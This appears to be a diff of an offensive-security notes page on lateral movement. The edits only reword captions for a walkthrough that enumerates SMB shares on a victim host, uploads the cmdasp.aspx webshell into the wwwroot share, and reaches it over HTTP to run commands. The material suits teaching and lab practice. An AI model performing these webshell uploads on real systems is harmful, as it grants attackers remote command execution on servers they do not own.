@@ -6,7 +6,7 @@ description: Lateral Movement
 
 ## Execution
 
-Enumerating a victim host `10.0.0.6` for shared webroot:
+Enumerating victim host `10.0.0.6` for any shares:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
@@ -32,7 +32,7 @@ Enter WORKGROUP\spot's password:
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Logging in to the wwwroot:
+Logging in to the `wwwroot` share:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
@@ -52,7 +52,7 @@ smb: \> ls
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Uploading a webshell:
+Uploading a webshell into the `wwwroot`:
 
 ```csharp
 put /usr/share/webshells/aspx/cmdasp.aspx c.aspx
@@ -69,9 +69,11 @@ smb: \> ls
 		6463487 blocks of size 4096. 3032260 blocks available
 ```
 
+Same as above in a picture:
+
 ![](../.gitbook/assets/webroot-ownage.png)
 
-Attacker executing shell commands via a webshell:
+Attacker can now access the newly uploaded webshell via `http://10.0.0.6/c.aspx` and start executing commands:
 
 ![](../.gitbook/assets/webroot-rce.png)
 
